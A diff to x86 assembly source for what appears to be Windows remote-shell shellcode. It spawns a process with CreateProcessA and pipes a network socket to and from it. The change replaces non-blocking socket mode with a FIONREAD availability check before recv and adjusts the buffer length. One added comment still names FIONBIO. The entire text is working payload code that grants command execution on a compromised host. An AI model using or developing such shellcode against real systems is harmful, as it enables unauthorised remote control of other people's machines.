@@ -43,6 +43,7 @@ sub esp, 16                       ; make room for handles
 mov ebp, esp
 
 %define DATA_FIONBIO   0x8004667e
+%define DATA_FIONREAD  0x4004667f
 
 %define DATA_SOCKET    [ebp + 40]
 %define DATA_KBASE     [ebp + 36]
@@ -153,16 +154,9 @@ LCreateProcessA:
   call FN_GETPROC
   call eax                        ; CreateProcessA()
 
-set_nonblocking:
-  mov eax, DATA_FIONBIO           ; FIONBIO
-  push eax                        ; argp
-  push esp                        ; argp ptr
-  push eax                        ; cmd
-  push DWORD DATA_SOCKET          ; socket
-  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
-
 make_buffer:
-  mov ah, 0x04                    ; 1024 + 1 = 1025
+  xor eax, eax                    ; arggggg
+  mov ah, 0x04                    ; 1024 + 0 = 1024
   xchg eax, esi                   ; save length into esi
   sub esp, esi                    ; make buffer space
   mov edi, esp
@@ -231,8 +225,22 @@ send_client:
 ; recv -> stdin
 
 recv_client:
+check_client:
+  mov eax, DATA_FIONREAD          ; FIONREAD
+  push eax                        ; argp
+  push esp                        ; argp ptr
+  push eax                        ; cmd
+  push DWORD DATA_SOCKET          ; socket
+  call FN_IOCTLSOCKET             ; ioctlsocket(socket, FIONBIO, on)
+  pop ecx                         ; get len
+  test eax, eax
+  jnz exit_process                ; ioctl error
+  test ecx, ecx
+  jz piper_loop                   ; no data
+
+call_recv_client:
   push eax                        ; flags
-  push esi                        ; len
+  push ecx                        ; len
   push edi                        ; buffer
   push DWORD DATA_SOCKET          ; socket
   call FN_RECV                    ; recv()
